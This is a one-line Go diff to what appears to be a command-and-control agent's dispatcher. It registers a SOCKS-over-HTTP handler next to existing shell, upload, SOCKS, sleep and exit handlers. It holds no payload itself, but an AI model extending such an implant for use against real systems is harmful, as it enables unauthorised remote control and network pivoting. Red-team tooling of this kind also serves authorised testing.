@@ -79,6 +79,7 @@ func NewCommandQueue() *CommandQueue {
 	queue.RegisterHandler(CmdUpload, wrapCommand(&UploadCommand{}))
 	queue.RegisterHandler(CmdShell, wrapCommand(&ShellCommand{}))
 	queue.RegisterHandler(CmdSocks, wrapCommand(&SocksCommand{}))
+	queue.RegisterHandler(CmdSocksHTTP, wrapCommand(GetSocksHTTPHandler()))
 	queue.RegisterHandler(CmdJobkill, wrapCommand(&JobKillCommand{}))
 	queue.RegisterHandler(CmdExit, wrapCommand(&ExitCommand{}))
 	queue.RegisterHandler(CmdSleep, wrapCommand(&SleepCommand{}))
